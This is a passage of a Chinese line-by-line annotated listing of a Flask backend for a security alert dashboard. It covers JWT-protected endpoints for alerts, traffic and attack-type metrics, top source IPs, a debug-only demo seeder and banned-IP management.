| 1305 | 路由装饰器：把下面的函数注册为 HTTP 页面或 API 入口。 | `    @app.route("/api/auth/me")` |
| 1306 | 认证装饰器：要求请求携带有效 JWT 后才能访问。 | `    @jwt_required()` |
| 1307 | 函数定义：声明 `auth_me` 的输入、处理逻辑和返回结果。 | `    def auth_me():  # type: ignore[unused-function]` |
| 1308 | 返回结果：把处理后的值交回调用方。 | `        return jsonify({"username": get_jwt_identity()}), 200` |
| 1309 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1310 | 注释：解释下面或当前这段代码的设计意图。 | `    # ---- 态势统计 ----------------------------------------------------` |
| 1311 | 路由装饰器：把下面的函数注册为 HTTP 页面或 API 入口。 | `    @app.route("/api/stats")` |
| 1312 | 认证装饰器：要求请求携带有效 JWT 后才能访问。 | `    @jwt_required()` |
| 1313 | 函数定义：声明 `api_stats` 的输入、处理逻辑和返回结果。 | `    def api_stats():  # type: ignore[unused-function]` |
| 1314 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        state.stats["total_threats"] = (` |
| 1315 | 函数调用：执行已有函数/方法完成当前步骤。 | `            db.session.query(func.count(Alert.id)).scalar() or 0` |
| 1316 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 1317 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        state.stats["banned_ips"] = (` |
| 1318 | 函数调用：执行已有函数/方法完成当前步骤。 | `            db.session.query(func.count(BannedIp.ip)).scalar() or 0` |
| 1319 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 1320 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        state.stats["security_score"] = _compute_security_score_db()` |
| 1321 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        state.stats["updated_at"] = _now_iso()` |
| 1322 | 返回结果：把处理后的值交回调用方。 | `        return jsonify(state.stats), 200` |
| 1323 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1324 | 注释：解释下面或当前这段代码的设计意图。 | `    # ---- 告警列表 / 详情 / 状态流转 / 类型聚合 -----------------------` |
| 1325 | 路由装饰器：把下面的函数注册为 HTTP 页面或 API 入口。 | `    @app.route("/api/alerts")` |
| 1326 | 认证装饰器：要求请求携带有效 JWT 后才能访问。 | `    @jwt_required()` |
| 1327 | 函数定义：声明 `api_alerts` 的输入、处理逻辑和返回结果。 | `    def api_alerts():  # type: ignore[unused-function]` |
| 1328 | 请求读取：从 HTTP 请求中提取参数、JSON 或上下文信息。 | `        limit = _safe_int(request.args.get("limit"), default=100, max_value=500)` |
| 1329 | 请求读取：从 HTTP 请求中提取参数、JSON 或上下文信息。 | `        offset = _safe_int(request.args.get("offset"), default=0, max_value=10_000, allow_zero=True)` |
| 1330 | 请求读取：从 HTTP 请求中提取参数、JSON 或上下文信息。 | `        level = request.args.get("level") or None` |
| 1331 | 请求读取：从 HTTP 请求中提取参数、JSON 或上下文信息。 | `        threat_type = request.args.get("type") or None` |
| 1332 | 请求读取：从 HTTP 请求中提取参数、JSON 或上下文信息。 | `        status_filter = request.args.get("status") or None` |
| 1333 | 请求读取：从 HTTP 请求中提取参数、JSON 或上下文信息。 | `        q = request.args.get("q") or None` |
| 1334 | 请求读取：从 HTTP 请求中提取参数、JSON 或上下文信息。 | `        since_raw = request.args.get("since")` |
| 1335 | 请求读取：从 HTTP 请求中提取参数、JSON 或上下文信息。 | `        until_raw = request.args.get("until")` |
| 1336 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        since = _parse_iso(since_raw) if since_raw else None` |
| 1337 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        until = _parse_iso(until_raw) if until_raw else None` |
| 1338 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1339 | 条件判断：满足条件时进入对应分支。 | `        if level and level not in ALERT_LEVELS:` |
| 1340 | 返回结果：把处理后的值交回调用方。 | `            return (` |
| 1341 | API 响应：把 Python 数据转换为 JSON 返回给前端。 | `                jsonify(` |
| 1342 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    _error_payload(` |
| 1343 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        code="invalid_level",` |
| 1344 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        message="level 非法",` |
| 1345 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    )` |
| 1346 | 代码语句：参与当前文件的业务流程或数据处理。 | `                ),` |
| 1347 | 代码语句：参与当前文件的业务流程或数据处理。 | `                400,` |
| 1348 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 1349 | 条件判断：满足条件时进入对应分支。 | `        if status_filter and status_filter not in ALERT_STATUSES:` |
| 1350 | 返回结果：把处理后的值交回调用方。 | `            return (` |
| 1351 | API 响应：把 Python 数据转换为 JSON 返回给前端。 | `                jsonify(` |
| 1352 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    _error_payload(` |
| 1353 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        code="invalid_status",` |
| 1354 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        message="status 非法",` |
| 1355 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    )` |
| 1356 | 代码语句：参与当前文件的业务流程或数据处理。 | `                ),` |
| 1357 | 代码语句：参与当前文件的业务流程或数据处理。 | `                400,` |
| 1358 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 1359 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1360 | 函数调用：执行已有函数/方法完成当前步骤。 | `        items, total = _query_alerts_from_db(` |
| 1361 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            limit=limit,` |
| 1362 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            offset=offset,` |
| 1363 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            level=level,` |
| 1364 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            threat_type=threat_type,` |
| 1365 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            status=status_filter,` |
| 1366 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            since=since,` |
| 1367 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            until=until,` |
| 1368 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            q=q,` |
| 1369 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 1370 | API 响应：把 Python 数据转换为 JSON 返回给前端。 | `        resp = jsonify(items)` |
| 1371 | 注释：解释下面或当前这段代码的设计意图。 | `        # 响应形状保持为数组以兼容 dashboard.js；分页元信息走响应头` |
| 1372 | 函数调用：执行已有函数/方法完成当前步骤。 | `        resp.headers["X-Total-Count"] = str(total)` |
| 1373 | 函数调用：执行已有函数/方法完成当前步骤。 | `        resp.headers["X-Offset"] = str(offset)` |
| 1374 | 函数调用：执行已有函数/方法完成当前步骤。 | `        resp.headers["X-Limit"] = str(limit)` |
| 1375 | 注释：解释下面或当前这段代码的设计意图。 | `        # 浏览器侧 JS 读取自定义头需要 CORS 暴露` |
| 1376 | 函数调用：执行已有函数/方法完成当前步骤。 | `        resp.headers["Access-Control-Expose-Headers"] = (` |
| 1377 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "X-Total-Count, X-Offset, X-Limit"` |
| 1378 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 1379 | 返回结果：把处理后的值交回调用方。 | `        return resp, 200` |
| 1380 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1381 | 路由装饰器：把下面的函数注册为 HTTP 页面或 API 入口。 | `    @app.route("/api/alerts/types")` |
| 1382 | 认证装饰器：要求请求携带有效 JWT 后才能访问。 | `    @jwt_required()` |
| 1383 | 函数定义：声明 `api_alert_types` 的输入、处理逻辑和返回结果。 | `    def api_alert_types():  # type: ignore[unused-function]` |
| 1384 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        rows = db.session.query(Alert.threat_type).distinct().all()` |
| 1385 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        types = sorted([str(r[0] or "unknown") for r in rows if r[0] is not None])` |
| 1386 | 返回结果：把处理后的值交回调用方。 | `        return jsonify(types), 200` |
| 1387 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1388 | 路由装饰器：把下面的函数注册为 HTTP 页面或 API 入口。 | `    @app.route("/api/alerts/<alert_id>")` |
| 1389 | 认证装饰器：要求请求携带有效 JWT 后才能访问。 | `    @jwt_required()` |
| 1390 | 函数定义：声明 `api_alert_detail` 的输入、处理逻辑和返回结果。 | `    def api_alert_detail(alert_id: str):  # type: ignore[unused-function]` |
| 1391 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        alert = db.session.get(Alert, alert_id)` |
| 1392 | 条件判断：满足条件时进入对应分支。 | `        if not alert:` |
| 1393 | 返回结果：把处理后的值交回调用方。 | `            return (` |
| 1394 | API 响应：把 Python 数据转换为 JSON 返回给前端。 | `                jsonify(` |
| 1395 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    _error_payload(` |
| 1396 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        code="alert_not_found",` |
| 1397 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        message="告警不存在",` |
| 1398 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    )` |
| 1399 | 代码语句：参与当前文件的业务流程或数据处理。 | `                ),` |
| 1400 | 代码语句：参与当前文件的业务流程或数据处理。 | `                404,` |
| 1401 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 1402 | 返回结果：把处理后的值交回调用方。 | `        return jsonify(_alert_to_api_dict(alert)), 200` |
| 1403 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1404 | 路由装饰器：把下面的函数注册为 HTTP 页面或 API 入口。 | `    @app.route("/api/alerts/<alert_id>/status", methods=["POST"])` |
| 1405 | 认证装饰器：要求请求携带有效 JWT 后才能访问。 | `    @jwt_required()` |
| 1406 | 函数定义：声明 `api_alert_update_status` 的输入、处理逻辑和返回结果。 | `    def api_alert_update_status(alert_id: str):  # type: ignore[unused-function]` |
| 1407 | 请求读取：从 HTTP 请求中提取参数、JSON 或上下文信息。 | `        payload = request.get_json(silent=True) or {}` |
| 1408 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        new_status = str(payload.get("status", "")).strip()` |
| 1409 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        note = str(payload.get("note", "")).strip() or None` |
| 1410 | 条件判断：满足条件时进入对应分支。 | `        if new_status not in ALERT_STATUSES:` |
| 1411 | 返回结果：把处理后的值交回调用方。 | `            return (` |
| 1412 | API 响应：把 Python 数据转换为 JSON 返回给前端。 | `                jsonify(` |
| 1413 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    {` |
| 1414 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        "error": "status 非法",` |
| 1415 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        "allowed": list(ALERT_STATUSES),` |
| 1416 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    }` |
| 1417 | 代码语句：参与当前文件的业务流程或数据处理。 | `                ),` |
| 1418 | 代码语句：参与当前文件的业务流程或数据处理。 | `                400,` |
| 1419 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 1420 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        updated = _update_alert_status_in_db(` |
| 1421 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            alert_id=alert_id,` |
| 1422 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            new_status=new_status,` |
| 1423 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            operator=str(get_jwt_identity() or "operator"),` |
| 1424 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            note=note,` |
| 1425 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 1426 | 条件判断：满足条件时进入对应分支。 | `        if not updated:` |
| 1427 | 返回结果：把处理后的值交回调用方。 | `            return jsonify({"error": "告警不存在"}), 404` |
| 1428 | 注释：解释下面或当前这段代码的设计意图。 | `        # 兼容层：保持内存态状态同步，避免尚未迁移的聚合逻辑出现视图抖动` |
| 1429 | 函数调用：执行已有函数/方法完成当前步骤。 | `        state.update_alert_status(alert_id, new_status)` |
| 1430 | 注释：解释下面或当前这段代码的设计意图。 | `        # 状态变化通过 WebSocket 同步给其他会话` |
| 1431 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 1432 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            socketio = app.extensions.get("guardian_socketio")` |
| 1433 | 条件判断：满足条件时进入对应分支。 | `            if socketio is not None:` |
| 1434 | 函数调用：执行已有函数/方法完成当前步骤。 | `                socketio.emit(` |
| 1435 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    "alert_updated",` |
| 1436 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    {"id": updated["id"], "status": updated["status"]},` |
| 1437 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 1438 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except Exception:  # noqa: BLE001 - 推送失败不应阻断主流程` |
| 1439 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.debug("alert_updated 广播失败", exc_info=True)` |
| 1440 | 返回结果：把处理后的值交回调用方。 | `        return jsonify(updated), 200` |
| 1441 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1442 | 注释：解释下面或当前这段代码的设计意图。 | `    # ---- 仅调试用：生成演示告警 --------------------------------------` |
| 1443 | 路由装饰器：把下面的函数注册为 HTTP 页面或 API 入口。 | `    @app.route("/api/alerts/_seed", methods=["POST"])` |
| 1444 | 认证装饰器：要求请求携带有效 JWT 后才能访问。 | `    @jwt_required()` |
| 1445 | 函数定义：声明 `api_alerts_seed` 的输入、处理逻辑和返回结果。 | `    def api_alerts_seed():  # type: ignore[unused-function]` |
| 1446 | 文档字符串：说明当前模块、类或函数的职责。 | `        """仅在 DEBUG 或 ALLOW_DEV_SEED=true 时启用，便于 UI review。` |
| 1447 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1448 | 代码语句：参与当前文件的业务流程或数据处理。 | `        故意使用 \`_seed\` 下划线前缀以区别于业务接口；生产环境一律返回 403。` |
| 1449 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 1450 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        cfg = get_config()` |
| 1451 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        allow = bool(getattr(cfg, "DEBUG", False)) or (` |
| 1452 | 函数调用：执行已有函数/方法完成当前步骤。 | `            os.environ.get("ALLOW_DEV_SEED", "").lower() == "true"` |
| 1453 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 1454 | 条件判断：满足条件时进入对应分支。 | `        if not allow:` |
| 1455 | 返回结果：把处理后的值交回调用方。 | `            return jsonify({"error": "dev seed 在当前环境未启用"}), 403` |
| 1456 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1457 | 请求读取：从 HTTP 请求中提取参数、JSON 或上下文信息。 | `        data = request.get_json(silent=True) or {}` |
| 1458 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        count = _safe_int(` |
| 1459 | 函数调用：执行已有函数/方法完成当前步骤。 | `            str(data.get("count", 12)),` |
| 1460 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            default=12,` |
| 1461 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            max_value=100,` |
| 1462 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            allow_zero=True,` |
| 1463 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 1464 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        created = _seed_demo_alerts(app, count=count) if count > 0 else 0` |
| 1465 | 返回结果：把处理后的值交回调用方。 | `        return jsonify({"status": "ok", "created": created}), 201` |
| 1466 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1467 | 注释：解释下面或当前这段代码的设计意图。 | `    # ---- 指标：流量趋势 / 攻击类型分布 / Top10 攻击来源 --------------` |
| 1468 | 路由装饰器：把下面的函数注册为 HTTP 页面或 API 入口。 | `    @app.route("/api/metrics/traffic")` |
| 1469 | 认证装饰器：要求请求携带有效 JWT 后才能访问。 | `    @jwt_required()` |
| 1470 | 函数定义：声明 `api_metrics_traffic` 的输入、处理逻辑和返回结果。 | `    def api_metrics_traffic():  # type: ignore[unused-function]` |
| 1471 | 请求读取：从 HTTP 请求中提取参数、JSON 或上下文信息。 | `        range_key = (request.args.get("range") or "24h").strip().lower()` |
| 1472 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        window_map: Dict[str, Tuple[timedelta, int, str]] = {` |
| 1473 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "24h": (timedelta(hours=24), 60, "hour"),` |
| 1474 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "7d": (timedelta(days=7), 60 * 24, "day"),` |
| 1475 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "30d": (timedelta(days=30), 60 * 24, "day"),` |
| 1476 | 代码语句：参与当前文件的业务流程或数据处理。 | `        }` |
| 1477 | 条件判断：满足条件时进入对应分支。 | `        if range_key not in window_map:` |
| 1478 | 返回结果：把处理后的值交回调用方。 | `            return (` |
| 1479 | API 响应：把 Python 数据转换为 JSON 返回给前端。 | `                jsonify(` |
| 1480 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    _error_payload(` |
| 1481 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        code="invalid_range",` |
| 1482 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        message="range 非法，必须是 24h/7d/30d",` |
| 1483 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    )` |
| 1484 | 代码语句：参与当前文件的业务流程或数据处理。 | `                ),` |
| 1485 | 代码语句：参与当前文件的业务流程或数据处理。 | `                400,` |
| 1486 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 1487 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1488 | 代码语句：参与当前文件的业务流程或数据处理。 | `        delta, bucket_size_min, bucket_label = window_map[range_key]` |
| 1489 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        now = datetime.now(timezone.utc).astimezone()` |
| 1490 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        start = now - delta` |
| 1491 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        total_min = max(1, int((now - start).total_seconds() // 60))` |
| 1492 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        bucket_count = max(1, total_min // bucket_size_min)` |
| 1493 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1494 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        points: List[Dict[str, Any]] = []` |
| 1495 | 循环：逐个处理集合或迭代器中的元素。 | `        for idx in range(bucket_count):` |
| 1496 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            bucket_start = start + timedelta(minutes=bucket_size_min * idx)` |
| 1497 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            points.append({"start": bucket_start, "count": 0})` |
| 1498 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1499 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        q = db.session.query(Alert).filter(` |
| 1500 | 函数调用：执行已有函数/方法完成当前步骤。 | `            Alert.timestamp >= start.astimezone(timezone.utc),` |
| 1501 | 函数调用：执行已有函数/方法完成当前步骤。 | `            Alert.timestamp <= now.astimezone(timezone.utc),` |
| 1502 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 1503 | 循环：逐个处理集合或迭代器中的元素。 | `        for row in q.all():` |
| 1504 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            ts = row.timestamp` |
| 1505 | 条件判断：满足条件时进入对应分支。 | `            if ts.tzinfo is None:` |
| 1506 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                ts = ts.replace(tzinfo=timezone.utc)` |
| 1507 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            ts_local = ts.astimezone()` |
| 1508 | 条件判断：满足条件时进入对应分支。 | `            if ts_local < start or ts_local > now:` |
| 1509 | 继续循环：跳过本轮剩余逻辑。 | `                continue` |
| 1510 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            bucket_idx = (` |
| 1511 | 函数调用：执行已有函数/方法完成当前步骤。 | `                int((ts_local - start).total_seconds() // 60) // bucket_size_min` |
| 1512 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 1513 | 条件判断：满足条件时进入对应分支。 | `            if 0 <= bucket_idx < len(points):` |
| 1514 | 代码语句：参与当前文件的业务流程或数据处理。 | `                points[bucket_idx]["count"] += 1` |
| 1515 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1516 | 条件判断：满足条件时进入对应分支。 | `        if range_key == "24h":` |
| 1517 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            xaxis = [p["start"].strftime("%H:%M") for p in points]` |
| 1518 | 兜底分支：处理前面条件都不满足的情况。 | `        else:` |
| 1519 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            xaxis = [p["start"].strftime("%m-%d") for p in points]` |
| 1520 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        series = [int(p["count"]) for p in points]` |
| 1521 | 返回结果：把处理后的值交回调用方。 | `        return (` |
| 1522 | API 响应：把 Python 数据转换为 JSON 返回给前端。 | `            jsonify(` |
| 1523 | 代码语句：参与当前文件的业务流程或数据处理。 | `                {` |
| 1524 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "range": range_key,` |
| 1525 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "bucket": bucket_label,` |
| 1526 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "xaxis": xaxis,` |
| 1527 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "series": series,` |
| 1528 | 代码语句：参与当前文件的业务流程或数据处理。 | `                }` |
| 1529 | 代码语句：参与当前文件的业务流程或数据处理。 | `            ),` |
| 1530 | 代码语句：参与当前文件的业务流程或数据处理。 | `            200,` |
| 1531 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 1532 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1533 | 路由装饰器：把下面的函数注册为 HTTP 页面或 API 入口。 | `    @app.route("/api/metrics/attack_types")` |
| 1534 | 认证装饰器：要求请求携带有效 JWT 后才能访问。 | `    @jwt_required()` |
| 1535 | 函数定义：声明 `api_metrics_attack_types` 的输入、处理逻辑和返回结果。 | `    def api_metrics_attack_types():  # type: ignore[unused-function]` |
| 1536 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        rows = (` |
| 1537 | 函数调用：执行已有函数/方法完成当前步骤。 | `            db.session.query(Alert.threat_type, func.count(Alert.id))` |
| 1538 | 函数调用：执行已有函数/方法完成当前步骤。 | `            .group_by(Alert.threat_type)` |
| 1539 | 函数调用：执行已有函数/方法完成当前步骤。 | `            .all()` |
| 1540 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 1541 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        distribution = {str(t or "unknown"): int(c) for t, c in rows}` |
| 1542 | 返回结果：把处理后的值交回调用方。 | `        return (` |
| 1543 | API 响应：把 Python 数据转换为 JSON 返回给前端。 | `            jsonify([{"name": k, "value": v} for k, v in distribution.items()]),` |
| 1544 | 代码语句：参与当前文件的业务流程或数据处理。 | `            200,` |
| 1545 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 1546 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1547 | 路由装饰器：把下面的函数注册为 HTTP 页面或 API 入口。 | `    @app.route("/api/metrics/top_attackers")` |
| 1548 | 认证装饰器：要求请求携带有效 JWT 后才能访问。 | `    @jwt_required()` |
| 1549 | 函数定义：声明 `api_metrics_top_attackers` 的输入、处理逻辑和返回结果。 | `    def api_metrics_top_attackers():  # type: ignore[unused-function]` |
| 1550 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        rows = (` |
| 1551 | 函数调用：执行已有函数/方法完成当前步骤。 | `            db.session.query(Alert.source_ip, func.count(Alert.id))` |
| 1552 | 函数调用：执行已有函数/方法完成当前步骤。 | `            .filter(Alert.source_ip != "")` |
| 1553 | 函数调用：执行已有函数/方法完成当前步骤。 | `            .group_by(Alert.source_ip)` |
| 1554 | 函数调用：执行已有函数/方法完成当前步骤。 | `            .order_by(func.count(Alert.id).desc())` |
| 1555 | 函数调用：执行已有函数/方法完成当前步骤。 | `            .limit(10)` |
| 1556 | 函数调用：执行已有函数/方法完成当前步骤。 | `            .all()` |
| 1557 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 1558 | 返回结果：把处理后的值交回调用方。 | `        return jsonify([{"ip": ip, "count": int(c)} for ip, c in rows]), 200` |
| 1559 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1560 | 注释：解释下面或当前这段代码的设计意图。 | `    # ---- 封禁 IP 管理 ------------------------------------------------` |
| 1561 | 路由装饰器：把下面的函数注册为 HTTP 页面或 API 入口。 | `    @app.route("/api/banned_ips", methods=["GET", "POST"])` |
| 1562 | 认证装饰器：要求请求携带有效 JWT 后才能访问。 | `    @jwt_required()` |
| 1563 | 函数定义：声明 `api_banned_ips` 的输入、处理逻辑和返回结果。 | `    def api_banned_ips():  # type: ignore[unused-function]` |
| 1564 | 条件判断：满足条件时进入对应分支。 | `        if request.method == "GET":` |
| 1565 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            rows = db.session.query(BannedIp).order_by(BannedIp.created_at.desc()).all()` |
| 1566 | 返回结果：把处理后的值交回调用方。 | `            return (` |
| 1567 | API 响应：把 Python 数据转换为 JSON 返回给前端。 | `                jsonify(` |
| 1568 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    [` |
| 1569 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        {"ip": r.ip, "reason": r.reason}` |
| 1570 | 循环：逐个处理集合或迭代器中的元素。 | `                        for r in rows` |
| 1571 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    ]` |
| 1572 | 代码语句：参与当前文件的业务流程或数据处理。 | `                ),` |
| 1573 | 代码语句：参与当前文件的业务流程或数据处理。 | `                200,` |
| 1574 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 1575 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1576 | 请求读取：从 HTTP 请求中提取参数、JSON 或上下文信息。 | `        data = request.get_json(silent=True) or {}` |
| 1577 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ip = str(data.get("ip", "")).strip()` |
| 1578 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        reason = str(data.get("reason", "manual"))[:200]` |
| 1579 | 条件判断：满足条件时进入对应分支。 | `        if not validate_ip(ip):` |
| 1580 | 返回结果：把处理后的值交回调用方。 | `            return jsonify({"error": "无效的 IP 地址"}), 400` |
| 1581 | 函数调用：执行已有函数/方法完成当前步骤。 | `        _persist_banned_ip(` |
| 1582 | 代码语句：参与当前文件的业务流程或数据处理。 | `            ip,` |
| 1583 | 代码语句：参与当前文件的业务流程或数据处理。 | `            reason,` |
| 1584 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            operator=str(get_jwt_identity() or "operator"),` |
| 1585 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 1586 | 函数调用：执行已有函数/方法完成当前步骤。 | `        _sync_banned_cache_from_db(state)` |
| 1587 | 返回结果：把处理后的值交回调用方。 | `        return jsonify({"status": "ok", "ip": ip, "reason": reason}), 201` |
| 1588 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 1589 | 路由装饰器：把下面的函数注册为 HTTP 页面或 API 入口。 | `    @app.route("/api/banned_ips/<ip>", methods=["DELETE"])` |
| 1590 | 认证装饰器：要求请求携带有效 JWT 后才能访问。 | `    @jwt_required()` |
| 1591 | 函数定义：声明 `api_banned_ip_delete` 的输入、处理逻辑和返回结果。 | `    def api_banned_ip_delete(ip: str):  # type: ignore[unused-function]` |
| 1592 | 条件判断：满足条件时进入对应分支。 | `        if not validate_ip(ip):` |
| 1593 | 返回结果：把处理后的值交回调用方。 | `            return jsonify({"error": "无效的 IP 地址"}), 400` |
| 1594 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        removed = _delete_banned_ip_persistent(ip)` |
| 1595 | 条件判断：满足条件时进入对应分支。 | `        if not removed:` |
| 1596 | 返回结果：把处理后的值交回调用方。 | `            return jsonify({"error": "IP 不在封禁列表"}), 404` |
| 1597 | 函数调用：执行已有函数/方法完成当前步骤。 | `        _sync_banned_cache_from_db(state)` |
